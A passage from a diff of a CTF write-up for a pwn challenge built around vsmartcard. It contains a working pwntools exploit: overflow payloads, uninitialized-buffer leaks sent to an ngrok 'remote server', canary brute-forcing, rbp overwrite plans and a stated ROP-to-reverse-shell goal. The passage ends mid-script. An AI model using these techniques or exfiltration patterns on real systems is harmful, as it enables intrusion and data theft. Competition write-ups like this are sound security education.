+</span></span><span style=display:flex><span>            <span style=color:#75715e>/* server mode, try to accept a client */</span>
+</span></span><span style=display:flex><span>            ctx<span style=color:#f92672>-&gt;</span>client_sock <span style=color:#f92672>=</span> <span style=color:#a6e22e>waitforclient</span>(ctx<span style=color:#f92672>-&gt;</span>server_sock, secs, usecs);
 </span></span></code></pre></div><p>It was patched from 0 to 3 to give us time for connection.
-<yg>vicc_getatr</yg> as the name suggests get data into the atrBuf:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    vicc_transmit(ctx, VPCD_CTRL_LEN, <span style="color:#f92672">&amp;</span>i, atr);
-</span></span></code></pre></div><p><yg>vicc_transmit</yg> will send a message and as the same time recv data:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (apdu_len <span style="color:#f92672">&amp;&amp;</span> apdu)
-</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> sendToVICC(ctx, apdu_len, apdu);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
-</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (r <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> rapdu)
-</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> recvFromVICC(ctx, rapdu);
-</span></span></code></pre></div><p>We are more intersted in <yg>recvFromVICC</yg>, we need to figure out the transfering data protocol:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#75715e">/* receive size of message on 2 bytes */</span>
-</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> recvall(ctx<span style="color:#f92672">-&gt;</span>client_sock, <span style="color:#f92672">&amp;</span>size, <span style="color:#66d9ef">sizeof</span> size);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (r <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span> size)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> r;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> ntohs(size);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0</span> <span style="color:#f92672">!=</span> size) {
-</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> realloc(<span style="color:#f92672">*</span>buffer, size);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (p <span style="color:#f92672">==</span> NULL) {
-</span></span><span style="display:flex;"><span>            errno <span style="color:#f92672">=</span> ENOMEM;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>buffer <span style="color:#f92672">=</span> p;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* receive message */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recvall(ctx<span style="color:#f92672">-&gt;</span>client_sock, <span style="color:#f92672">*</span>buffer, size);  
-</span></span></code></pre></div><p>The transfering scheme is as follow:</p>
-<ol>
-<li>Read the first 2 bytes. This will be the message size.</li>
-<li>Read enough bytes with the size received.</li>
-</ol>
-<p>Now we should recap <yg>SCardStatus</yg> do:</p>
-<ol>
-<li>Call <yg>vicc_connect</yg> and <yg>vicc_getatr</yg> to listen and confirm thats there is a client connecting to.</li>
-<li>Call <yg>vicc_getatr</yg> again to fill the atrBuf<br>
-The last function we have to look into is <yg>transmit</yg> which is called in <yg>do_transmit</yg> function:</li>
-</ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>LONG <span style="color:#a6e22e">transmit</span>(SCARDHANDLE hCard, LPCBYTE sendBuf, DWORD sendLen, LPBYTE transmitBuf, DWORD <span style="color:#f92672">*</span>transmitLen)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    LONG rv;
-</span></span><span style="display:flex;"><span>    SCARD_IO_REQUEST pioSendPci;
-</span></span><span style="display:flex;"><span>    DWORD recvLen;
-</span></span><span style="display:flex;"><span>    BYTE recvBuf[MAX_BUF];
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    recvLen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(recvBuf);
-</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span> SCardTransmit(hCard, <span style="color:#f92672">&amp;</span>pioSendPci, sendBuf, sendLen, NULL, recvBuf, <span style="color:#f92672">&amp;</span>recvLen);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (rv <span style="color:#f92672">!=</span> SCARD_S_SUCCESS)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> rv;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    memcpy(transmitBuf, recvBuf, recvLen);
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>transmitLen <span style="color:#f92672">=</span> recvLen;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> SCARD_S_SUCCESS;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><yg>SCardTransmit</yg> is very similar to <yg>vicc_transmit</yg>. So what <yg>transmit</yg> does is send sendBuf and receive data into recvBuf. <br>
-But the received data has to pass a check, the last 2 bytes have to be &lsquo;\x90\x00&rsquo;:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>LONG <span style="color:#a6e22e">check_transmit</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> buf, DWORD bufLen)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bufLen <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (buf[bufLen<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\x90&#39;</span> <span style="color:#f92672">&amp;&amp;</span> buf[bufLen<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\x00&#39;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>That&rsquo;s the important part of internal vsmartcard.</p>
-<h3 id="lfyg-exploiting-with-ssrf-in-a-pwn-challenge-lfyg"><lf><yg> Exploiting with SSRF in a pwn challenge </lf></yg></h3>
-<p>The internal listening port of vscard for vicc_connect is 35963. Because this port is not exposed to the outside, we have to abuse the overflow bug, overwrite the port and host.<br>
-<red>-&gt; This will make connect_backend to connect to anything we want </red></p>
-<p>Therefore our plan is:</p>
-<ol>
-<li>First connection will send &lsquo;BUY_FLAG /buy_flag HTTP/1.1&rsquo;, to invoke <yg>vicc_connect</yg>, this will serve as the server.</li>
-<li>Second connection will send request that overflows host and port, makes <yg>connect_backend</yg> connect to the first connection&rsquo;s server.</li>
-<li>Now our request data in second connection will se sent to first connection&rsquo;s server.<br>
-Knowing that there are 2 bugs: the overflow atrBuf and uninitialized transmitBuf, this will enable us to trigger these 2 bugs.</li>
-</ol>
-<h3 id="lfyg-the-full-exploit-plan-lfyg"><lf><yg> The full exploit plan </lf></yg></h3>
-<p>First because each process is forked, so every child and parent shares the same address and canary.<br>
-Therefore we only need to leak once in each process and can be reused later.<br>
-Our stages of exploit:</p>
-<ol>
-<li>
-<p>The first stage:<br>
-We want to leak some address through the <red>uninitialized transmitBuf</red>. To do this, in our do_transmit process we will send very little data to fill into <yg>transmitBuf</yg>.<br>
-This will copy things on stack to credit struct (Sadly there is only stack address)<br>
-Connection 1 will serve as server. Send &lsquo;BUY_FLAG /buy_flag&rsquo; + manyA to overflow port and host, affect the <yg>connect_backed</yg> so after the <yg>do_transmit</yg>, this credit struct will be send to our remote server to get the leaked address.<br>
-Connecction 2 overflow port and host to connect to connection 1&rsquo;s server, send very little data to transmitBuf, dont fill it.</p>
-</li>
-<li>
-<p>The second stage:
-Leak the canary. Abuse the <red>overflow atrBuf bug</red>, so we will overwrite into canary value byte by byte. We will slowly guess each byte of canary.<br>
-If we receive Internal error that means we ran in to __stack_check_fail, thus thats the wrong value.<br>
-If not, that means we guessed the correct byte of canary.</p>
-</li>
-<li>
-<p>The third stage:
-With the canary and stack address, we will overwrite into saved rbp. This will affect the <yg>route</yg> function.<br>
-Because the credit struct address is saved at <code>[rbp-0x18]</code>. So we can overwrite rbp to somewhere near our initial <yg>requestBuf</yg>.<br>
-And make a fake stack layout so that we will achieve arbitrary read, with this we will read libc address on the stack.<br>
-<yg>connect_backend</yg> has to <red>send the data in credit struct to host and port</red>. Port buffer address is at <code>[rbp-0x48]</code>, host buffer address is at <code>[rbp-0x40]</code>.<br>
-Carefully craft the fake stack layout and we will receive the leak in our remote server.</p>
-</li>
-<li>
-<p>The last stage:<br>
-ROP then reverse shell.</p>
-</li>
-</ol>
-<h3 id="lfyg-my-messy-exploit-script-lfyg"><lf><yg> My messy exploit script </lf></yg></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#ip = &#34;127.0.0.1&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#port = 13337</span>
-</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag-market-us.balsnctf.com&#39;</span>
-</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">52090</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Our remote server</span>
-</span></span><span style="display:flex;"><span>r_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;2.tcp.ngrok.io&#39;</span>
-</span></span><span style="display:flex;"><span>r_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">16971</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FIRST STAGE: Leak stack address through the uninitialized transmitBuf during do_transmit 
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">which makes the credit structs hold stack address
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Due to fork this makes the stack address remains the same
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> p16(<span style="color:#ae81ff">791</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;&#39;GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA35963AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocalhost HTTP/1.1&#39;&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>req <span style="color:#f92672">=</span> overflow
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>atr <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># Satisfy the atr check</span>
-</span></span><span style="display:flex;"><span>req <span style="color:#f92672">+=</span> p16(len(atr), endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>req <span style="color:#f92672">+=</span> atr
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill very little into the transmitBuf</span>
-</span></span><span style="display:flex;"><span>req <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">2</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>req <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># To satisfy the check_transmit</span>
-</span></span><span style="display:flex;"><span>req <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">2</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>req <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># To satisfy the check_transmit</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, port)
-</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, port)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;/bin/nc -lnvp 51235&#34;</span>,shell <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connection io and connection r are communicating with each other</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connection r will have port and host overflown with our remote server so we will receive the credit struct</span>
-</span></span><span style="display:flex;"><span>req1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;BUY_FLAG /&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;buy_flag&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">384</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>) <span style="color:#f92672">+</span> str(r_port)<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">384</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">+</span> r_ip<span style="color:#f92672">.</span>encode() 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(req1)
-</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(req)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;card_number=&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>stack_leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;STACK LEAK ADDRESS: &#34;</span> <span style="color:#f92672">+</span> hex(stack_leak))
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SECOND STAGE:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">During the receiving of atrBuf, in the card_status the atrLen is uninitialized which means
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">we can overflow the atrBuf
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Abuse this to overwrite into canary byte by byte, if crash and receive Internal error means wrong valule
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">If not that means the byte we guessed was correct
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Due to fork this canary remains the same.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
-</span></span><span style="display:flex;"><span>		tmp <span style="color:#f92672">=</span> canary <span style="color:#f92672">+</span> (j)<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>,byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>)
-</span></span><span style="display:flex;"><span>		req_ <span style="color:#f92672">=</span> overflow  
-</span></span><span style="display:flex;"><span>		to <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x28</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">+</span> tmp
-</span></span><span style="display:flex;"><span>		req_ <span style="color:#f92672">+=</span> p16(len(to), endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>		req_ <span style="color:#f92672">+=</span> to
-</span></span><span style="display:flex;"><span>		req_ <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">0x40</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>		req_ <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x00</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>		req_ <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">0x40</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>		req_ <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x00</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>		r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, port)
-</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, port)
-</span></span><span style="display:flex;"><span>		r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;BUY_FLAG /buy_flag HTTP/1.1&#39;</span>)
-</span></span><span style="display:flex;"><span>		time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
-</span></span><span style="display:flex;"><span>		io<span style="color:#f92672">.</span>sendline(req_)
-</span></span><span style="display:flex;"><span>		data <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Error&#39;</span> <span style="color:#f92672">in</span> data:
-</span></span><span style="display:flex;"><span>			io<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>			r<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>			io<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>			r<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>			canary <span style="color:#f92672">=</span> tmp
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;CANARY: &#34;</span> <span style="color:#f92672">+</span> hex(int<span style="color:#f92672">.</span>from_bytes(canary,byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>)))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STAGE THREE:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Leak libc address by overwriting the saved rbp
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Makes the rbp such that it will use the address we have in fake_stack_layout for the connect_backend and snprintf
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Especially the credit address is at [rbp - 0x18], thus we have arbitrary read
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Read libc address on the stack
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Similarly to leak stack address our connection r will have port and host overflown to our remote server
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> stack_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa58</span>
-</span></span><span style="display:flex;"><span>port_addr <span style="color:#f92672">=</span> stack_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f0</span>
-</span></span><span style="display:flex;"><span>host_addr <span style="color:#f92672">=</span> port_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x180</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>fake_stack_layout <span style="color:#f92672">=</span> p64(port_addr) <span style="color:#f92672">+</span> p64(host_addr) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(stack_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x808</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>req2 <span style="color:#f92672">=</span> req1<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">800</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> fake_stack_layout <span style="color:#75715e"># Connection r will have the fake_stack_layout appended at the end of request</span>
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">=</span> overflow
-</span></span><span style="display:flex;"><span>to <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x28</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">+</span> canary <span style="color:#f92672">+</span> p64(rbp)
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> p16(len(to), endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> to
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">2</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x00</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">2</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x00</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, port)
-</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, port)
